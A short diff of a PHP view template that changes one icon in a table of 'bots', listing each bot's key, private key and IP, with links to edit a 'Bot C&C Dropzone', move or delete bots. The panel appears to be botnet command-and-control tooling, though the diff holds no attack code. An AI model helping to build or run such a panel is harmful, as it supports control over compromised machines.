@@ -69,7 +69,7 @@
                   <td><?php echo $bot->bot_key; ?></td>
                   <td><?php echo $bot->bot_privatekey; ?></td>
                   <td> <?php echo $bot->bot_ip; ?> </td>
-                  <td class="tc"> <a href="<?php echo base_url().'login/editBot/'.$bot->bot_id; ?>"> <img src="<?php echo base_url(); ?>/img/icons/small/botedit.png" alt="Edit Bot C&C Dropzone" title="Edit Bot C&C Dropzone" border="0" /> </a> <a href="<?php echo base_url().'login/moveBot/'.$bot->bot_id; ?>"> <img src="<?php echo base_url(); ?>/img/icons/small/move.png" alt="Move Bot" title="Move Bot" border="0" /> </a>  <a href="<?php echo base_url().'login/delBot/'.$bot->bot_id.'/'.$token; ?>"> <img src="<?php echo base_url(); ?>/img/icons/small/Erase.png" alt="Delete Bot" title="Delete Bot" border="0" onclick="return confirm('Are you sure you want to delete this Bot?')" /> </a></td>
+                  <td class="tc"> <a href="<?php echo base_url().'login/editBot/'.$bot->bot_id; ?>"> <img src="<?php echo base_url(); ?>/img/icons/small/botedit.png" alt="Edit Bot C&C Dropzone" title="Edit Bot C&C Dropzone" border="0" /> </a> <a href="<?php echo base_url().'login/moveBot/'.$bot->bot_id; ?>"> <img src="<?php echo base_url(); ?>/img/icons/small/botchange.png" alt="Move Bot" title="Move Bot" border="0" /> </a>  <a href="<?php echo base_url().'login/delBot/'.$bot->bot_id.'/'.$token; ?>"> <img src="<?php echo base_url(); ?>/img/icons/small/Erase.png" alt="Delete Bot" title="Delete Bot" border="0" onclick="return confirm('Are you sure you want to delete this Bot?')" /> </a></td>
                 </tr>
                 <?php endforeach;?>
               </tbody>
